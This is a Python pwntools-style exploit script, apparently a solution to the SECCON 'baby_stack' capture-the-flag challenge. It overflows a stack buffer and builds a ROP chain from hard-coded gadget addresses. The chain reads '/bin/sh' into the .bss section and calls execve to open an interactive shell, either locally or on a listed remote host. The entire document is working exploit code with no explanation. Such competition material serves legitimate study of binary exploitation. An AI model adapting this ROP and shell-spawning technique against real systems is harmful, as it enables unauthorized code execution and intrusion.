#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './baby_stack'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'baby_stack.pwn.seccon.jp', 'port':15285})
env.select('local')

#==========

binf = ELF(bin_file)
addr_str_thank      = binf.search('Thank you').next()
addr_bss            = binf.sep_section['.bss']

addr_poprdi_or      = 0x00470931
addr_poprdx_or      = 0x004a247c
addr_syscall        = 0x00456889

#==========

def attack(conn):
    rop = ROP(binf)

    exploit  = 'a'*0x68
    exploit += p64(addr_str_thank)
    exploit += p64(0x20)
    exploit += 'b'*(0xc8-len(exploit))
    exploit += p64(addr_str_thank)
    exploit += p64(0x20)
    exploit += 'c'*(0x198-len(exploit))

    exploit += p64(rop.rax.address)
    exploit += p64(addr_bss+0x100)
    exploit += p64(addr_poprdi_or)
    exploit += p64(0x0)
    exploit += p64(rop.rsi.address)
    exploit += p64(addr_bss)
    exploit += p64(addr_poprdx_or)
    exploit += p64(0x8)
    exploit += p64(rop.rax.address)
    exploit += p64(constants.SYS_read)
    exploit += p64(addr_syscall)

    exploit += p64(rop.rax.address)
    exploit += p64(addr_bss+0x100)
    exploit += p64(addr_poprdi_or)
    exploit += p64(addr_bss)
    exploit += p64(rop.rsi.address)
    exploit += p64(0)
    exploit += p64(addr_poprdx_or)
    exploit += p64(0)
    exploit += p64(rop.rax.address)
    exploit += p64(constants.SYS_execve)
    exploit += p64(addr_syscall)

    conn.sendlineafter('>> ', 'hoge')
    conn.sendlineafter('>> ', exploit)
    sleep(0.05)
    conn.send('/bin/sh\0')

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
